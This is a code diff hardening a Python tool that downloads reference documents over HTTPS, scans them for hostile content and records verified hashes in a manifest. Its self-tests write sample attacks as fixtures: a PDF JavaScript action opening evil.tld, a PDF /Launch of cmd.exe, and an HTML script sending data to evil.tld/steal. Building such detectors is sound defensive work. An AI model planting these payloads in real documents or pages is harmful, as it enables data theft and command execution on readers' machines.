@@ -15,21 +15,30 @@ Enforces the Shadow Army Research Source Policy (Points 1-8):
    - Scans HTML/Markdown/Text files for active script injection (`<script`, `javascript:`, `<iframe`, `<object`, `<embed`, `onerror=`, `onload=`)
    - Enforces file size bounds (rejects 0-byte files or >100 MB bombs)
    - Computes SHA-256 and records verified metadata in `docs/references/references_manifest.json`
-   - Automatically deletes unsafe downloaded files from the local PC (`DELETED_UNSAFE_FILE`).
+   - Discards rejected downloads from temporary staging. Local scans are read-only.
 """
 
 from __future__ import annotations
 
 import argparse
+import contextlib
 import hashlib
+import http.client
+import ipaddress
 import json
+import ntpath
+import os
 import re
+import socket
+import ssl
+import stat
 import sys
 import tempfile
+import time
 import urllib.parse
-import urllib.request
+import warnings
 from datetime import datetime, timezone
-from pathlib import Path
+from pathlib import Path, PureWindowsPath
 from typing import Any
 
 ALLOWED_EXTENSIONS = {".pdf", ".md", ".txt", ".json", ".yaml", ".yml", ".html", ".htm", ".csv"}
@@ -68,6 +77,43 @@ TEXT_DANGEROUS_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
 ]
 
 MAX_FILE_BYTES = 100 * 1024 * 1024  # 100 MB
+DOWNLOAD_TIMEOUT_SECONDS = 30
+MAX_REDIRECTS = 5
+READ_CHUNK_BYTES = 64 * 1024
+MANIFEST_NAME = "references_manifest.json"
+
+
+def _is_link(metadata: os.stat_result) -> bool:
+    return stat.S_ISLNK(metadata.st_mode) or bool(
+        getattr(metadata, "st_file_attributes", 0) & stat.FILE_ATTRIBUTE_REPARSE_POINT
+    )
+
+
+def _checked_stat(path: Path) -> os.stat_result:
+    if path.drive.startswith("\\\\"):
+        raise ValueError("Network and device paths are not allowed for local references.")
+    for component in (*reversed(path.parents), path):
+        metadata = component.lstat()
+        if _is_link(metadata):
+            raise ValueError(f"Links and reparse points are not allowed: {component}")
+    return metadata
+
+
+def _read_reference(path: Path, metadata: os.stat_result) -> bytes:
+    if metadata.st_size > MAX_FILE_BYTES:
+        raise ValueError("Reference file exceeds the size limit.")
+    flags = os.O_RDONLY | getattr(os, "O_BINARY", 0) | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_NONBLOCK", 0)
+    with os.fdopen(os.open(path, flags), "rb") as source:
+        opened = os.fstat(source.fileno())
+        if (not stat.S_ISREG(opened.st_mode) or not os.path.samestat(metadata, opened)
+                or (opened.st_size, opened.st_mtime_ns) != (metadata.st_size, metadata.st_mtime_ns)):
+            raise ValueError("File changed before it could be read.")
+        content = source.read(MAX_FILE_BYTES + 1)
+        after = _checked_stat(path)
+        if (len(content) != metadata.st_size or not os.path.samestat(opened, after)
+                or (after.st_size, after.st_mtime_ns) != (opened.st_size, opened.st_mtime_ns)):
+            raise ValueError("File changed while it was being read.")
+        return content
 
 
 def check_double_extension(filename: str) -> str | None:
@@ -83,21 +129,28 @@ def check_double_extension(filename: str) -> str | None:
 
 
 def verify_file_safety(file_path: Path, quarantine_delete: bool = False) -> dict[str, Any]:
-    """Run the 7-Point File Safety Gate on a local file."""
-    resolved = file_path.resolve()
+    """Inspect a local file without modifying it."""
+    if quarantine_delete:
+        warnings.warn("quarantine_delete is deprecated. Local scans are read-only.", DeprecationWarning, stacklevel=2)
+    path = file_path.absolute()
     reasons: list[str] = []
 
-    if not resolved.exists() or not resolved.is_file():
+    try:
+        metadata = _checked_stat(path)
+        if not stat.S_ISREG(metadata.st_mode):
+            raise ValueError("Path is not a regular file.")
+        raw_bytes = _read_reference(path, metadata) if 0 < metadata.st_size <= MAX_FILE_BYTES else b""
+    except (OSError, ValueError) as exc:
         return {
-            "file": str(resolved),
+            "file": str(path),
             "safe": False,
-            "status": "FILE_NOT_FOUND",
-            "reasons": ["File does not exist or is not a regular file"],
+            "status": "FILE_NOT_FOUND" if isinstance(exc, FileNotFoundError) else "FILE_UNREADABLE",
+            "reasons": [str(exc)],
             "quarantine_action": "NONE",
         }
 
-    ext = resolved.suffix.lower()
-    double_ext_err = check_double_extension(resolved.name)
+    ext = path.suffix.lower()
+    double_ext_err = check_double_extension(path.name)
     if double_ext_err:
         reasons.append(double_ext_err)
 
@@ -106,23 +159,19 @@ def verify_file_safety(file_path: Path, quarantine_delete: bool = False) -> dict
     elif ext not in ALLOWED_EXTENSIONS:
         reasons.append(f"Extension '{ext}' is not in allowed reference formats ({sorted(ALLOWED_EXTENSIONS)})")
 
-    size_bytes = resolved.stat().st_size
+    size_bytes = metadata.st_size
     if size_bytes == 0:
         reasons.append("File is empty (0 bytes)")
     elif size_bytes > MAX_FILE_BYTES:
         reasons.append(f"File size ({size_bytes} bytes) exceeds 100 MB safety ceiling")
 
-    raw_bytes = b""
-    if size_bytes > 0 and size_bytes <= MAX_FILE_BYTES:
-        raw_bytes = resolved.read_bytes()
-
     # Check 3: Binary executable magic bytes masquerading as a reference document
     for label, magic in BINARY_EXECUTABLE_MAGIC:
         if raw_bytes.startswith(magic):
-            reasons.append(f"Binary executable header detected ({label}) inside '{resolved.name}'")
+            reasons.append(f"Binary executable header detected ({label}) inside '{path.name}'")
 
     if raw_bytes.startswith(b"PK\x03\x04"):
-        reasons.append(f"ZIP/Office archive header (PK) disguised as '{ext}' in '{resolved.name}'")
+        reasons.append(f"ZIP/Office archive header (PK) disguised as '{ext}' in '{path.name}'")
 
     # Check 4: Format-specific inspection
     if ext == ".pdf" and raw_bytes:
@@ -135,7 +184,7 @@ def verify_file_safety(file_path: Path, quarantine_delete: bool = False) -> dict
 
     elif ext in {".md", ".txt", ".json", ".yaml", ".yml", ".csv", ".html", ".htm"} and raw_bytes:
         if b"\x00" in raw_bytes[:4096]:
-            reasons.append(f"Null bytes (binary payload) found inside text reference '{resolved.name}'")
+            reasons.append(f"Null bytes (binary payload) found inside text reference '{path.name}'")
         text_content = raw_bytes.decode("utf-8", errors="replace")
         # For Markdown, ignore fenced code blocks when checking HTML tags unless it's .html/.htm
         inspect_text = text_content
@@ -147,24 +196,15 @@ def verify_file_safety(file_path: Path, quarantine_delete: bool = False) -> dict
 
     sha256_hex = hashlib.sha256(raw_bytes).hexdigest() if raw_bytes else ""
     safe = len(reasons) == 0
-    quarantine_action = "NONE"
-
-    if not safe and quarantine_delete and resolved.exists():
-        try:
-            resolved.unlink()
-            quarantine_action = "DELETED_UNSAFE_FILE"
-        except Exception as exc:
-            quarantine_action = f"DELETE_FAILED: {exc}"
-
     return {
-        "file": str(resolved),
-        "filename": resolved.name,
+        "file": str(path),
+        "filename": path.name,
         "size_bytes": size_bytes,
         "sha256": sha256_hex,
         "safe": safe,
         "status": "SAFE" if safe else "DANGEROUS_FILE_BLOCKED",
         "reasons": reasons,
-        "quarantine_action": quarantine_action,
+        "quarantine_action": "NONE",
     }
 
 
@@ -200,6 +240,175 @@ def classify_source_metadata(
     }
 
 
+def _public_https_url(url: str) -> urllib.parse.SplitResult:
+    if any(ord(char) <= 32 or ord(char) == 127 for char in url):
+        raise ValueError("URL contains whitespace or control characters.")
+    parsed = urllib.parse.urlsplit(url)
+    if parsed.scheme != "https" or not parsed.hostname or parsed.username is not None:
+        raise ValueError("Public reference URLs must use HTTPS without URL credentials.")
+    if "%" in parsed.hostname or "\\" in parsed.netloc or parsed.port == 0:
+        raise ValueError("Invalid host or port in reference URL.")
+    return parsed
+
+
+def _is_public_address(address: str) -> bool:
+    ip = ipaddress.ip_address(address)
+    if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped is not None:
+        ip = ip.ipv4_mapped
+    return ip.is_global and not ip.is_multicast and not ip.is_reserved
+
+
+class _PublicHTTPSConnection(http.client.HTTPSConnection):
+    def __init__(self, host: str, *, port: int | None = None, timeout: float, context: ssl.SSLContext) -> None:
+        super().__init__(host, port=port, timeout=timeout, context=context)
+        self.tls_context = context
+
+    def connect(self) -> None:
+        addresses = socket.getaddrinfo(self.host, self.port, type=socket.SOCK_STREAM)
+        if not addresses or any(not _is_public_address(addr[4][0]) for addr in addresses):
+            raise ValueError("Reference host must resolve exclusively to public addresses.")
+
+        last_error = None
+        deadline = time.monotonic() + self.timeout
+        for family, kind, protocol, _, address in addresses:
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                raise TimeoutError("Reference connection timed out.")
+            sock = socket.socket(family, kind, protocol)
+            try:
+                sock.settimeout(remaining)
+                sock.connect(address)
+                self.sock = self.tls_context.wrap_socket(sock, server_hostname=self.host)
+                return
+            except OSError as exc:
+                sock.close()
+                last_error = exc
+        raise OSError("Could not establish a verified connection to the reference host.") from last_error
+
+
+def _save_response(response: http.client.HTTPResponse, candidate: Path, deadline: float) -> None:
+    with candidate.open("xb") as output:
+        expected_length = response.getheader("Content-Length")
+        length = int(expected_length) if expected_length is not None else None
+        if length is not None and not 0 <= length <= MAX_FILE_BYTES:
+            raise ValueError("Reference download exceeds the allowed size limit.")
+        size = 0
+        while True:
+            if time.monotonic() >= deadline:
+                raise TimeoutError("Reference download timed out.")
+            chunk = response.read1(min(READ_CHUNK_BYTES, MAX_FILE_BYTES - size + 1))
+            if not chunk:
+                break
+            size += len(chunk)
+            if size > MAX_FILE_BYTES:
+                raise ValueError("Reference download exceeds the allowed size limit.")
+            output.write(chunk)
+        if length is not None and size != length:
+            raise ValueError("Incomplete reference download.")
+
+
+def _download_to_stage(url: str, candidate: Path) -> str:
+    context = ssl.create_default_context()
+    deadline = time.monotonic() + DOWNLOAD_TIMEOUT_SECONDS
+    for _ in range(MAX_REDIRECTS + 1):
+        parsed = _public_https_url(url)
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            raise TimeoutError("Reference download timed out.")
+        path = urllib.parse.quote(parsed.path or "/", safe="!$&'()*+,;=:@/-._~%")
+        query = urllib.parse.quote(parsed.query, safe="!$&'()*+,;=:@/-._~%?")
+        request_target = urllib.parse.urlunsplit(("", "", path, query, ""))
+        connection = _PublicHTTPSConnection(parsed.hostname, port=parsed.port, timeout=remaining, context=context)
+        with contextlib.closing(connection):
+            connection.request("GET", request_target, headers={
+                "User-Agent": "ShadowArmy-ReferenceVerifier/1.0 (+https://github.com/RidhuanDEV/claude-skills)",
+                "Accept-Encoding": "identity",
+                "Connection": "close",
+            })
+            with connection.getresponse() as response:
+                if response.status in (301, 302, 303, 307, 308):
+                    location = response.getheader("Location")
+                    if not location:
+                        raise ValueError("Reference redirect has no destination.")
+                    url = urllib.parse.urljoin(url, location)
+                    continue
+                if response.status != 200 or response.getheader("Content-Range") is not None:
+                    raise ValueError(f"Reference server did not return a complete HTTP 200 response ({response.status}).")
+                if (response.getheader("Content-Encoding") or "identity").lower() != "identity":
+                    raise ValueError("Unsupported content encoding for reference download.")
+                _save_response(response, candidate, deadline)
+                return parsed._replace(query="", fragment="").geturl()
+    raise ValueError("Reference download exceeded the redirect limit.")
+
+
+def _prepare_archive(dest_dir: Path) -> Path:
+    root = dest_dir.absolute()
+    if root.drive.startswith("\\\\"):
+        raise ValueError("Network and device paths are not allowed for local references.")
+    for directory in (*reversed(root.parents), root):
+        try:
+            metadata = directory.lstat()
+        except FileNotFoundError:
+            directory.mkdir(exist_ok=True)
+            metadata = directory.lstat()
+        if _is_link(metadata) or not stat.S_ISDIR(metadata.st_mode):
+            raise ValueError(f"Unsafe archive directory: {directory}")
+    return root
+
+
+def _existing_archive_file(path: Path) -> os.stat_result | None:
+    try:
+        metadata = _checked_stat(path)
+    except FileNotFoundError:
+        return None
+    if not stat.S_ISREG(metadata.st_mode):
+        raise ValueError(f"Archive path is not a regular file: {path}")
+    return metadata
+
+
+def _publish_reference(candidate: Path, target: Path, record: dict[str, Any]) -> None:
+    manifest_path = target.parent / MANIFEST_NAME
+    lock = target.parent / ".reference-manifest.lock"
+    with lock.open("xb"):
+        pass
+    try:
+        previous = _existing_archive_file(target)
+        manifest_metadata = _existing_archive_file(manifest_path)
+        manifest: dict[str, Any] = {"references": []}
+        if manifest_metadata is not None:
+            manifest = json.loads(_read_reference(manifest_path, manifest_metadata).decode("utf-8-sig"))
+        if not isinstance(manifest.get("references"), list):
+            raise ValueError("Existing manifest has no references list.")
+
+        def archived_name(entry: dict[str, Any]) -> str:
+            artifact = entry.get("archive") or entry.get("safety") or {}
+            return os.path.normcase(artifact.get("filename") or artifact.get("file") or "")
+
+        manifest["references"] = [
+            entry for entry in manifest["references"] if archived_name(entry) != os.path.normcase(target.name)
+        ]
+        manifest["references"].append(record)
+        receipt = candidate.parent / "manifest.tmp"
+        receipt.write_text(json.dumps(manifest, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
+
+        backup = candidate.parent / "previous"
+        if previous is not None:
+            target.replace(backup)
+        installed = False
+        try:
+            candidate.replace(target)
+            installed = True
+            receipt.replace(manifest_path)
+        except BaseException:
+            if previous is not None:
+                backup.replace(target)
+            elif installed:
+                target.unlink()
+            raise
+    finally:
+        lock.unlink()
+
+
 def download_and_verify_reference(
     url: str,
     dest_dir: Path,
@@ -209,56 +418,51 @@ def download_and_verify_reference(
     doi: str = "",
     peer_reviewed: bool | None = None,
     filename: str | None = None,
+    expected_sha256: str | None = None,
 ) -> dict[str, Any]:
-    """Download a reference file to dest_dir, run the 7-Point Safety Gate, delete if unsafe, and update manifest."""
-    parsed = urllib.parse.urlparse(url)
-    if parsed.scheme not in ("https", "http"):
-        raise ValueError(f"Only http/https URLs are permitted for reference download (got '{parsed.scheme}')")
+    """Stage a public HTTPS reference and publish it after local safety and integrity checks."""
+    parsed = _public_https_url(url)
+    if expected_sha256 is not None:
+        if len(expected_sha256) != 64 or any(char not in "0123456789abcdefABCDEF" for char in expected_sha256):
+            raise ValueError("Expected SHA-256 must contain 64 hexadecimal characters.")
+        expected_sha256 = expected_sha256.lower()
 
-    dest_dir.mkdir(parents=True, exist_ok=True)
     inferred_name = filename or Path(parsed.path).name or "reference.pdf"
     if "." not in inferred_name:
         inferred_name += ".pdf"
     safe_name = re.sub(r"[^A-Za-z0-9._-]", "_", inferred_name)
+    is_reserved = getattr(ntpath, "isreserved", lambda name: PureWindowsPath(name).is_reserved())
+    if safe_name.endswith(".") or safe_name.lower() in {"manifest.tmp", MANIFEST_NAME} or is_reserved(safe_name):
+        raise ValueError("Reserved archive filename.")
+    dest_dir = _prepare_archive(dest_dir)
     target_path = dest_dir / safe_name
 
-    req = urllib.request.Request(
-        url,
-        headers={"User-Agent": "ShadowArmy-ReferenceVerifier/1.0 (+https://github.com/RidhuanDEV/claude-skills)"},
-    )
-    with urllib.request.urlopen(req, timeout=30) as resp:
-        data = resp.read(MAX_FILE_BYTES + 1)
-    if safe_name.lower() in {".", "..", "manifest.tmp", "references_manifest.json"}:
-        raise ValueError("Reserved archive filename.")
-    with tempfile.TemporaryDirectory(dir=dest_dir) as staging:
+    with tempfile.TemporaryDirectory(prefix=".reference-fetch-", dir=dest_dir) as staging:
         candidate = Path(staging) / safe_name
-        candidate.write_bytes(data)
+        final_url = _download_to_stage(url, candidate)
+        safety = verify_file_safety(candidate)
+        if expected_sha256 is not None and safety.get("sha256") != expected_sha256:
+            safety["safe"] = False
+            safety["status"] = "INTEGRITY_MISMATCH"
+            safety["reasons"].append("Downloaded bytes do not match the expected SHA-256.")
+        safety["file"] = str(target_path) if safety["safe"] else safe_name
+        if not safety["safe"]:
+            safety["quarantine_action"] = "DISCARDED_STAGING_FILE"
 
-        safety = verify_file_safety(candidate, quarantine_delete=True)
-        safety['file'] = str(target_path) if safety['safe'] else safe_name
-        meta = classify_source_metadata(title=title, doi_or_url=doi or url, venue=venue, year=year, peer_reviewed=peer_reviewed)
+        recorded_url = parsed._replace(query="", fragment="").geturl()
+        meta = classify_source_metadata(title=title, doi_or_url=doi or recorded_url, venue=venue, year=year, peer_reviewed=peer_reviewed)
 
         record = {
             **meta,
-            "download_url": url,
+            "download_url": recorded_url,
+            "final_url": final_url,
+            "expected_sha256": expected_sha256,
             "verified_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
             "safety": safety,
         }
 
         if safety["safe"]:
-            manifest_path = dest_dir / "references_manifest.json"
-            manifest: dict[str, Any] = {"references": []}
-            if manifest_path.exists():
-                manifest = json.loads(manifest_path.read_text(encoding="utf-8-sig"))
-                if not isinstance(manifest.get("references"), list):
-                    raise ValueError("Existing manifest has no references list.")
-            manifest["references"] = [r for r in manifest.get("references", []) if r.get("safety", {}).get("filename") != safe_name]
-            manifest["references"].append(record)
-            receipt = Path(staging) / "manifest.tmp"
-            receipt.write_text(json.dumps(manifest, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
-
-            candidate.replace(target_path)
-            receipt.replace(manifest_path)
+            _publish_reference(candidate, target_path, record)
     return record
 
 
@@ -270,17 +474,17 @@ def run_self_test() -> dict[str, Any]:
         probes.append({"probe": name, "passed": passed, "detail": detail})
 
     with tempfile.TemporaryDirectory() as tmp:
-        root = Path(tmp)
+        root = Path(tmp).resolve()
 
         # --- PRECISION PROBES (5 realistic safe inputs that MUST pass as SAFE) ---
         p1 = root / "iso_29148_excerpt.pdf"
         p1.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n%%EOF\n")
-        r1 = verify_file_safety(p1, quarantine_delete=True)
+        r1 = verify_file_safety(p1)
         add_probe("PRECISION-1: Clean standard PDF (`%PDF-1.7`) passes and stays on disk", r1["safe"] and p1.exists(), json.dumps(r1["reasons"]))
 
         p2 = root / "pdf_mentioning_javascript_in_prose.pdf"
         p2.write_bytes(b"%PDF-1.5\nstream\nThis paper compares Python and JavaScript AST parsers.\nendstream\n%%EOF\n")
-        r2 = verify_file_safety(p2, quarantine_delete=True)
+        r2 = verify_file_safety(p2)
         add_probe("PRECISION-2: PDF mentioning the English word 'JavaScript' in body prose (not `/JavaScript` token) is NOT false-flagged", r2["safe"] and p2.exists(), json.dumps(r2["reasons"]))
 
         p3 = root / "nist_ssdf_notes.md"
@@ -290,12 +494,12 @@ def run_self_test() -> dict[str, Any]:
             "```html\n<script>alert(1)</script>\n```\n",
             encoding="utf-8",
         )
-        r3 = verify_file_safety(p3, quarantine_delete=True)
+        r3 = verify_file_safety(p3)
         add_probe("PRECISION-3: Markdown note with fenced code block example passes as SAFE", r3["safe"] and p3.exists(), json.dumps(r3["reasons"]))
 
         p4 = root / "rfc9110_http.txt"
         p4.write_text("RFC 9110: HTTP Semantics. Status 200 OK.\n", encoding="utf-8")
-        r4 = verify_file_safety(p4, quarantine_delete=True)
+        r4 = verify_file_safety(p4)
         add_probe("PRECISION-4: Clean plain-text RFC specification passes as SAFE", r4["safe"] and p4.exists(), json.dumps(r4["reasons"]))
 
         p5_meta = classify_source_metadata(
@@ -311,49 +515,49 @@ def run_self_test() -> dict[str, Any]:
             json.dumps(p5_meta),
         )
 
-        # --- RECALL PROBES (5 dangerous inputs that MUST be blocked and deleted) ---
+        # --- RECALL PROBES (5 dangerous inputs that MUST be blocked without deleting the source) ---
         rc1 = root / "disguised_malware.pdf"
         rc1.write_bytes(b"MZ\x90\x00\x03\x00\x00\x00Fake Windows EXE disguised as PDF")
-        rr1 = verify_file_safety(rc1, quarantine_delete=True)
+        rr1 = verify_file_safety(rc1)
         add_probe(
-            "RECALL-1: Windows PE executable (`MZ`) disguised as `.pdf` is blocked and deleted",
-            not rr1["safe"] and not rc1.exists() and rr1["quarantine_action"] == "DELETED_UNSAFE_FILE",
+            "RECALL-1: Windows PE executable (`MZ`) disguised as `.pdf` is blocked and preserved for review",
+            not rr1["safe"] and rc1.exists() and rr1["quarantine_action"] == "NONE",
             json.dumps(rr1["reasons"]),
         )
 
         rc2 = root / "paper.pdf.exe"
         rc2.write_bytes(b"MZ\x90\x00")
-        rr2 = verify_file_safety(rc2, quarantine_delete=True)
+        rr2 = verify_file_safety(rc2)
         add_probe(
-            "RECALL-2: Double-extension spoof (`paper.pdf.exe`) is blocked and deleted",
-            not rr2["safe"] and not rc2.exists(),
+            "RECALL-2: Double-extension spoof (`paper.pdf.exe`) is blocked and preserved for review",
+            not rr2["safe"] and rc2.exists(),
             json.dumps(rr2["reasons"]),
         )
 
         rc3 = root / "exploit_js.pdf"
         rc3.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Action /S /JavaScript /JS (app.launchURL('http://evil.tld')) >>\nendobj\n%%EOF\n")
-        rr3 = verify_file_safety(rc3, quarantine_delete=True)
+        rr3 = verify_file_safety(rc3)
         add_probe(
-            "RECALL-3: PDF with embedded `/JavaScript` / `/JS` execution object is blocked and deleted",
-            not rr3["safe"] and not rc3.exists(),
+            "RECALL-3: PDF with embedded `/JavaScript` / `/JS` execution object is blocked and preserved for review",
+            not rr3["safe"] and rc3.exists(),
             json.dumps(rr3["reasons"]),
         )
 
         rc4 = root / "exploit_launch.pdf"
         rc4.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Action /S /Launch /Win << /F (cmd.exe) >> >>\nendobj\n%%EOF\n")
-        rr4 = verify_file_safety(rc4, quarantine_delete=True)
+        rr4 = verify_file_safety(rc4)
         add_probe(
-            "RECALL-4: PDF with `/Launch` command execution action is blocked and deleted",
-            not rr4["safe"] and not rc4.exists(),
+            "RECALL-4: PDF with `/Launch` command execution action is blocked and preserved for review",
+            not rr4["safe"] and rc4.exists(),
             json.dumps(rr4["reasons"]),
         )
 
         rc5 = root / "phishing_reference.html"
         rc5.write_text("<html><body><script>fetch('http://evil.tld/steal')</script></body></html>", encoding="utf-8")
-        rr5 = verify_file_safety(rc5, quarantine_delete=True)
+        rr5 = verify_file_safety(rc5)
         add_probe(
-            "RECALL-5: HTML reference containing active `<script>` payload is blocked and deleted",
-            not rr5["safe"] and not rc5.exists(),
+            "RECALL-5: HTML reference containing active `<script>` payload is blocked and preserved for review",
+            not rr5["safe"] and rc5.exists(),
             json.dumps(rr5["reasons"]),
         )
 
@@ -372,7 +576,11 @@ def assess_reference(manifest_path: Path, filename: str, expected_version: str) 
     """Check a pinned offline reference for one consumer version, without fetching or modifying it."""
     if not filename or Path(filename).name != filename or not expected_version.strip():
         raise ValueError("A plain archive filename and consumer version are required.")
-    data = json.loads(manifest_path.read_text(encoding="utf-8-sig"))
+    manifest_path = manifest_path.absolute()
+    manifest_metadata = _existing_archive_file(manifest_path)
+    if manifest_metadata is None:
+        return {"status": "UNKNOWN", "reason": "Local source manifest is unavailable."}
+    data = json.loads(_read_reference(manifest_path, manifest_metadata).decode("utf-8-sig"))
     matches = []
     for record in data["references"]:
         artifact = record.get("archive") or record.get("safety") or {}
@@ -381,9 +589,8 @@ def assess_reference(manifest_path: Path, filename: str, expected_version: str) 
     if len(matches) != 1:
         return {"status": "UNKNOWN", "reason": "Missing or ambiguous source record."}
     record, artifact = matches[0]
-    root = manifest_path.parent.resolve()
-    path = (root / filename).resolve()
-    if path.parent != root or not path.is_file():
+    path = manifest_path.parent / filename
+    if path.parent != manifest_path.parent or _existing_archive_file(path) is None:
         return {"status": "UNKNOWN", "reason": "Local source unavailable or outside the archive."}
     checked = verify_file_safety(path)
     if not checked["safe"] or checked["sha256"] != artifact.get("sha256"):
@@ -396,6 +603,30 @@ def assess_reference(manifest_path: Path, filename: str, expected_version: str) 
             "limitations": "Local pin matched; upstream freshness has not been checked."}
 
 
+def scan_local_references(target: Path) -> dict[str, Any]:
+    target = target.absolute()
+    paths = [target]
+    results: list[dict[str, Any]] = []
+    while paths:
+        path = paths.pop()
+        try:
+            if stat.S_ISDIR(_checked_stat(path).st_mode):
+                paths.extend(sorted((child for child in path.iterdir() if child.name != MANIFEST_NAME), reverse=True))
+                continue
+        except (OSError, ValueError) as exc:
+            results.append({"file": str(path), "safe": False, "status": "FILE_UNREADABLE", "reasons": [str(exc)],
+                            "quarantine_action": "NONE"})
+            continue
+        results.append(verify_file_safety(path))
+    return {
+        "target": str(target),
+        "checked_count": len(results),
+        "all_safe": bool(results) and all(result["safe"] for result in results),
+        "results": results,
+        "status": "NO_FILES" if not results else "SCANNED",
+    }
+
+
 def main() -> int:
     parser = argparse.ArgumentParser(description="Shadow Army Reference Downloader & 7-Point File Safety Verifier")
     parser.add_argument("--self-test", action="store_true", help="Run precision & recall probes on the file safety verifier")
@@ -403,7 +634,7 @@ def main() -> int:
 
     p_scan = sub.add_parser("scan", help="Scan a local reference file or directory for dangerous content")
     p_scan.add_argument("target", help="File or directory path to scan")
-    p_scan.add_argument("--quarantine-delete", action="store_true", help="Automatically delete files that fail safety checks")
+    p_scan.add_argument("--quarantine-delete", action="store_true", help="Deprecated compatibility flag. Scans are read-only.")
 
     p_fetch = sub.add_parser("fetch", help="Download a reference URL to local PC, verify safety, and record in references_manifest.json")
     p_fetch.add_argument("--url", required=True, help="HTTPS URL of the reference document (PDF/MD/TXT/HTML)")
@@ -414,6 +645,7 @@ def main() -> int:
     p_fetch.add_argument("--doi", default="", help="DOI or standard identifier")
     p_fetch.add_argument("--peer-reviewed", choices=["true", "false"], default=None, help="Explicit peer-review status")
     p_fetch.add_argument("--filename", default=None, help="Optional local filename")
+    p_fetch.add_argument("--expected-sha256", default=None, help="Trusted SHA-256 checksum for the downloaded bytes")
 
     assess = sub.add_parser("assess", help="Check an archived reference against a pinned consumer version")
     assess.add_argument("manifest", type=Path)
@@ -436,25 +668,28 @@ def main() -> int:
         return 0 if result["status"] == "PIN_MATCH" else 1
 
     if args.cmd == "scan":
-        target = Path(args.target).resolve()
-        files = [target] if target.is_file() else [p for p in target.rglob("*") if p.is_file() and p.name != "references_manifest.json"]
-        results = [verify_file_safety(f, quarantine_delete=args.quarantine_delete) for f in files]
-        all_safe = all(r["safe"] for r in results)
-        print(json.dumps({"target": str(target), "checked_count": len(results), "all_safe": all_safe, "results": results}, indent=2, ensure_ascii=False))
-        return 0 if all_safe else 1
+        if args.quarantine_delete:
+            print("--quarantine-delete is deprecated. Local scans are read-only.", file=sys.stderr)
+        result = scan_local_references(Path(args.target))
+        print(json.dumps(result, indent=2, ensure_ascii=False))
+        return 0 if result["all_safe"] else 1
 
     if args.cmd == "fetch":
         pr = None if args.peer_reviewed is None else (args.peer_reviewed == "true")
-        res = download_and_verify_reference(
-            url=args.url,
-            dest_dir=Path(args.dest_dir).resolve(),
-            title=args.title,
-            venue=args.venue,
-            year=args.year,
-            doi=args.doi,
-            peer_reviewed=pr,
-            filename=args.filename,
-        )
+        try:
+            res = download_and_verify_reference(
+                url=args.url,
+                dest_dir=Path(args.dest_dir),
+                title=args.title,
+                venue=args.venue,
+                year=args.year,
+                doi=args.doi,
+                peer_reviewed=pr,
+                filename=args.filename,
+                expected_sha256=args.expected_sha256,
+            )
+        except (OSError, ValueError, http.client.HTTPException) as exc:
+            res = {"safety": {"safe": False, "status": "FETCH_FAILED", "reasons": [str(exc)]}}
         print(json.dumps(res, indent=2, ensure_ascii=False))
         return 0 if res["safety"]["safe"] else 1
 
